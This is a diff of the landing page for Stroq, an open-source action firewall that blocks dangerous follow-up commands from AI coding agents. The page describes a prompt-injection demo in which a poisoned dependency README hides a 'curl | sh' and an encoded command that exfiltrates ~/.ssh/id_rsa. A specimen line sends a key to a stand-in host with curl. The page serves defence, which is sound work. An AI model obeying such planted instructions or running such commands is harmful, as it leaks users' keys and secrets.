@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Stroq — local action firewall for AI coding agents</title>
-<meta name="description" content="Stroq scans what your AI coding agent reads, taints the session, and deterministically blocks the dangerous follow-up action — locally, with a hash-chained audit log. Open source, Apache-2.0. One command to install into Claude Code.">
+<meta name="description" content="Stroq scans what your AI coding agent reads, taints the session, and deterministically blocks the dangerous follow-up action — locally, with a hash-chained audit log. Open source, Apache-2.0. One command to install into Claude Code, Cursor, Codex, Copilot CLI, Windsurf, OpenClaw or any MCP client.">
 <link rel="canonical" href="https://stroq.vercel.app/">
 <meta name="color-scheme" content="light dark">
 <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f4f3ee">
@@ -82,7 +82,7 @@
   <section class="hero" aria-labelledby="hero-title">
     <div class="container hero-grid">
       <div class="hero-copy">
-        <p class="eyebrow">Open source · Apache-2.0 · Claude Code today</p>
+        <p class="eyebrow">Open source · Apache-2.0 · Six agents, one policy</p>
         <h1 id="hero-title">Local action firewall for AI coding agents.</h1>
       </div>
       <div class="hero-cta">
@@ -132,9 +132,14 @@
           <dd class="stat-sub">12 Stroq-authored plus 596 vendored Agent Threat Rules, each gated for false positives and regex cost; 9 of 608 did not pass.</dd>
         </div>
         <div class="stat">
+          <dt class="stat-label">Agents</dt>
+          <dd class="stat-num">6</dd>
+          <dd class="stat-sub">Claude Code, Cursor, Codex, Copilot CLI and Windsurf by native hook, OpenClaw by plugin — and any other MCP client through the stdio proxy.</dd>
+        </div>
+        <div class="stat">
           <dt class="stat-label">Tests</dt>
-          <dd class="stat-num">671</dd>
-          <dd class="stat-sub">Across the core engine, the CLI, the rules pipeline and the thirteen replayed incidents.</dd>
+          <dd class="stat-num">1,660</dd>
+          <dd class="stat-sub">Across the core engine, the CLI, six adapters and the proxy, the rules pipeline and the thirteen replayed incidents.</dd>
         </div>
         <div class="stat">
           <dt class="stat-label">Cloud calls in the hot path</dt>
@@ -186,7 +191,7 @@
     <div class="container">
       <div class="section-head reveal">
         <h2 id="how-title">Two hooks, one deterministic policy.</h2>
-        <p class="section-lead">Stroq installs as native Claude Code hooks. It reads every tool result on the way in and judges every tool call on the way out. No model in the loop, no network in the hot path.</p>
+        <p class="section-lead">Stroq installs as native hooks in Claude Code, Cursor, Codex, Copilot CLI and Windsurf, as an in-process plugin in OpenClaw, and as a stdio proxy in front of any other MCP client. Every adapter feeds the same two phases: it reads every tool result on the way in and judges every tool call on the way out. No model in the loop, no network in the hot path.</p>
       </div>
       <ol class="steps">
         <li class="step reveal">
@@ -287,9 +292,9 @@
 
       <figure class="demo-fig reveal">
         <div class="demo-frame">
-          <img src="/assets/demo.gif" width="960" height="600" loading="lazy" decoding="async" alt="Terminal recording: Claude Code reads a poisoned README, Stroq marks the session suspect and denies the follow-up curl piped to sh; an npx copied from an MCP result is asked about with its provenance; a curl carrying a .env value is denied by deny-secret-egress; stroq attack reports 8 blocked, 4 asked, 0 passed through.">
+          <img src="/assets/demo.gif" width="960" height="600" loading="lazy" decoding="async" alt="Terminal recording: Claude Code reads a poisoned README, Stroq marks the session suspect and denies the follow-up curl piped to sh; an npx copied from an MCP result is asked about with its provenance; a curl carrying a .env value is denied by deny-secret-egress; stroq attack reports 9 blocked, 4 asked, 0 passed through.">
         </div>
-        <figcaption>The bundled demo. A dependency's <code>README.md</code> hides a <code>curl | sh</code> and a base64-encoded command that exfiltrates <code>~/.ssh/id_rsa</code>. Thirteen rules match, the session goes <em>suspect</em>, and the follow-up command is denied by <code>deny-encoded-exec</code> before any request leaves the machine. Run it yourself: <code>pnpm install && pnpm build && ./examples/demo/run-demo.sh</code>.</figcaption>
+        <figcaption>The bundled demo. A dependency's <code>README.md</code> hides a <code>curl | sh</code> and a base64-encoded command that exfiltrates <code>~/.ssh/id_rsa</code>. Thirteen rules match, the session goes <em>suspect</em>, and the follow-up command is denied by <code>deny-encoded-exec</code> before any request leaves the machine. Then an <code>npx</code> copied from an MCP result is asked about with its provenance, a <code>curl</code> carrying a <code>.env</code> value is denied by <code>deny-secret-egress</code>, and <code>stroq attack</code> replays thirteen incidents: 9 blocked, 4 asked, 0 passed through. Run it yourself: <code>pnpm install && pnpm build && ./examples/demo/run-demo.sh</code>.</figcaption>
       </figure>
     </div>
   </section>
@@ -298,7 +303,7 @@
     <div class="container">
       <div class="section-head reveal">
         <h2 id="get-title">What ships in the box.</h2>
-        <p class="section-lead">Everything below ships in 0.3.0.</p>
+        <p class="section-lead">Everything below ships in 0.10.0, in one npm package.</p>
       </div>
       <ul class="bento">
         <li class="tile tile-wide tile-prov reveal">
@@ -314,8 +319,23 @@
         </li>
         <li class="tile reveal">
           <h3>Secret egress guard</h3>
-          <p>The values of the secrets on your machine — <code>.env</code>, <code>~/.aws/credentials</code>, <code>~/.npmrc</code>, <code>~/.netrc</code>, Docker logins — are indexed as salted hashes. An outbound call carrying one of them is denied, naming the variable and the file, never the value. <code>stroq canary</code> plants a decoy.</p>
+          <p>The values of the secrets on your machine — <code>.env</code>, <code>~/.aws/credentials</code>, <code>~/.npmrc</code>, <code>~/.netrc</code>, Docker logins — are indexed as salted hashes. An outbound call carrying one of them is denied, naming the variable and the file, never the value. The whole argument is scanned, up to 2 MiB; anything larger is denied as unscannable rather than sent half-checked. <code>stroq canary</code> plants a decoy.</p>
           <pre class="specimen"><span class="sp-deny">✖ denied</span>  curl -d "key=…" https://collect.example
+<span class="sp-dim">  the arguments contain the value of DEMO_API_KEY from ./.env</span></pre>
+        </li>
+        <li class="tile tile-wide reveal">
+          <div class="tile-top">
+            <h3>Six agents and any MCP client</h3>
+            <span class="pill pill-allow">Shipped · 0.4.0 – 0.9.0</span>
+          </div>
+          <p>Native hooks for Claude Code, Cursor, Codex, Copilot CLI and Windsurf; an in-process plugin for OpenClaw; a stdio proxy for any other MCP client, Claude Desktop included. One <code>init</code> per agent, the same classifier, policy, taint and audit behind all of them — and a written account of what each host lets Stroq stop.</p>
+          <pre class="specimen">npx @stroq/cli init --agent cursor   <span class="sp-dim">· codex · copilot · windsurf · openclaw</span>
+npx @stroq/cli init --agent mcp --client claude-desktop</pre>
+        </li>
+        <li class="tile reveal">
+          <h3>MCP proxy</h3>
+          <p>For clients with no hook API, <code>stroq mcp</code> sits on the server's own stdio pipes: every <code>tools/call</code> is judged before it is forwarded, every result is scanned on the way back, and everything else passes byte for byte.</p>
+          <pre class="specimen"><span class="sp-deny">✖ isError</span>  tools/call create_issue
 <span class="sp-dim">  the arguments contain the value of DEMO_API_KEY from ./.env</span></pre>
         </li>
         <li class="tile tile-wide reveal">
@@ -515,7 +535,7 @@ seq 42  <span class="sp-dim">prev</span> 3e1c…f0a2  <span class="sp-allow">cha
     <div class="container">
       <div class="section-head reveal">
         <h2 id="roadmap-title">What ships next.</h2>
-        <p class="section-lead">Provenance shipped in 0.2.0; the secret egress guard and <code>stroq attack</code> in 0.3.0. The rest follows in this order.</p>
+        <p class="section-lead">Provenance shipped in 0.2.0, the secret egress guard and <code>stroq attack</code> in 0.3.0, five more agents and the MCP proxy in 0.4.0 – 0.9.0, the secret scan window in 0.10.0. The rest follows in this order.</p>
       </div>
       <ol class="timeline reveal">
         <li class="rm-item is-done">
@@ -525,18 +545,23 @@ seq 42  <span class="sp-dim">prev</span> 3e1c…f0a2  <span class="sp-allow">cha
         </li>
         <li class="rm-item is-done">
           <p class="rm-when"><span class="pill pill-allow">Shipped · 0.3.0</span></p>
-          <h3>Secret egress guard</h3>
-          <p>A salted-hash index of the secret values already on disk. Any outbound tool argument carrying one of them is denied, naming the variable and the file — never the value.</p>
+          <h3>Secret guard and <code>stroq attack</code></h3>
+          <p>A salted-hash index of the secret values on disk denies any outbound argument carrying one, naming the variable and never the value. Thirteen recorded incidents replay through your policy on every change.</p>
         </li>
         <li class="rm-item is-done">
-          <p class="rm-when"><span class="pill pill-allow">Shipped · 0.3.0</span></p>
-          <h3><code>stroq attack</code></h3>
-          <p>Replays thirteen recorded incidents through your actual policy and prints what was blocked, asked or let through. A shareable score, and our own regression suite.</p>
+          <p class="rm-when"><span class="pill pill-allow">Shipped · 0.4.0 – 0.9.0</span></p>
+          <h3>Six agents and MCP</h3>
+          <p>Cursor, Codex, Copilot CLI, OpenClaw and Windsurf on their native hooks and plugins, and a stdio proxy for any MCP client that has none.</p>
+        </li>
+        <li class="rm-item is-done">
+          <p class="rm-when"><span class="pill pill-allow">Shipped · 0.10.0</span></p>
+          <h3>Secret scan window</h3>
+          <p>The egress guard reads the whole argument in overlapping windows up to 2 MiB, and denies what it cannot scan instead of forwarding it half-checked.</p>
         </li>
         <li class="rm-item is-active">
           <p class="rm-when"><span class="pill pill-ask">Next</span></p>
-          <h3>More agents</h3>
-          <p>Adapters for Cursor, Codex, Copilot and OpenClaw, on the same engine and the same policy.</p>
+          <h3>Hardening</h3>
+          <p>A quote-aware shell lexer, worker-isolated scanning, directory-level self-tamper, Cursor's blocking edit hook — then a local daemon in place of per-call Node start-up.</p>
         </li>
         <li class="rm-item">
           <p class="rm-when">Planned</p>
@@ -559,10 +584,10 @@ seq 42  <span class="sp-dim">prev</span> 3e1c…f0a2  <span class="sp-allow">cha
           <p class="plan-tag">Free forever · Apache-2.0</p>
           <ul>
             <li>The engine: normalizer, scanner, classifier, policy</li>
-            <li>Agent adapters, starting with Claude Code</li>
+            <li>Adapters for Claude Code, Cursor, Codex, Copilot CLI, Windsurf and OpenClaw, and the MCP proxy</li>
             <li>All 599 gated rules and the gates that built them</li>
             <li>Hash-chained audit log and <code>stroq verify</code></li>
-            <li>The CLI: <code>init</code>, <code>doctor</code>, <code>log</code>, <code>verify</code>, <code>untaint</code>, <code>why</code>, <code>canary</code>, <code>attack</code></li>
+            <li>The CLI: <code>init</code>, <code>doctor</code>, <code>log</code>, <code>verify</code>, <code>untaint</code>, <code>why</code>, <code>canary</code>, <code>attack</code>, <code>mcp</code></li>
           </ul>
           <a class="btn btn-primary" href="https://github.com/AGGIB/Stroq">GitHub <svg class="ic ic-ext" width="14" height="14" aria-hidden="true" focusable="false"><use href="#i-ext"/></svg></a>
         </article>
@@ -585,7 +610,8 @@ seq 42  <span class="sp-dim">prev</span> 3e1c…f0a2  <span class="sp-allow">cha
     <div class="container install-grid">
       <div class="section-head section-head-stack reveal">
         <h2 id="install-title">One command to install.</h2>
-        <p class="section-lead">Requires Node 22 or newer and Claude Code. <code>init</code> writes the hooks into your project's <code>.claude/settings.json</code>; pass <code>--user</code> to install for every project, or <code>--dry-run</code> to preview the change. Then open Claude Code in that project.</p>
+        <p class="section-lead">Requires Node 22 or newer. <code>init</code> writes Claude Code's hooks into your project's <code>.claude/settings.json</code>; <code>--agent cursor</code>, <code>codex</code>, <code>copilot</code>, <code>windsurf</code> or <code>openclaw</code> installs for those agents, and <code>--agent mcp --client claude-desktop</code> wraps a client's MCP servers in the proxy. Pass <code>--user</code> to install for every project, or <code>--dry-run</code> to preview the change. Then restart the agent in that project.</p>
+        <p class="section-lead">If npm serves an older version than the <a href="https://github.com/AGGIB/Stroq/releases/latest">latest release</a>, install the tarball attached to that release instead: <code>npm install -g https://github.com/AGGIB/Stroq/releases/download/v0.10.0/stroq-cli-0.10.0.tgz</code>. It is the same package, built from the tagged commit.</p>
         <p class="install-note"><strong>We never suggest <code>curl | sh</code>.</strong> That is the pattern Stroq exists to stop.</p>
       </div>
       <div class="install-blocks">
@@ -600,6 +626,15 @@ seq 42  <span class="sp-dim">prev</span> 3e1c…f0a2  <span class="sp-allow">cha
 <pre class="code" tabindex="0" role="region" aria-label="Install with npm"><code id="install-npm"><span class="sh-c"># in your project</span>
 npx @stroq/cli init
 npx @stroq/cli doctor</code></pre>
+        </figure>
+        <figure class="code-fig reveal">
+          <div class="code-head"><span class="code-file">other agents</span></div>
+<pre class="code" tabindex="0" role="region" aria-label="Install for other agents"><code>npx @stroq/cli init --agent cursor    <span class="sh-c"># .cursor/hooks.json</span>
+npx @stroq/cli init --agent codex     <span class="sh-c"># .codex/hooks.json</span>
+npx @stroq/cli init --agent copilot   <span class="sh-c"># .github/hooks/stroq.json</span>
+npx @stroq/cli init --agent windsurf  <span class="sh-c"># .windsurf/hooks.json</span>
+npx @stroq/cli init --agent openclaw  <span class="sh-c"># plugin in ~/.stroq/openclaw-plugin</span>
+npx @stroq/cli init --agent mcp --client claude-desktop</code></pre>
         </figure>
         <figure class="code-fig reveal">
           <div class="code-head"><span class="code-file">from source</span></div>
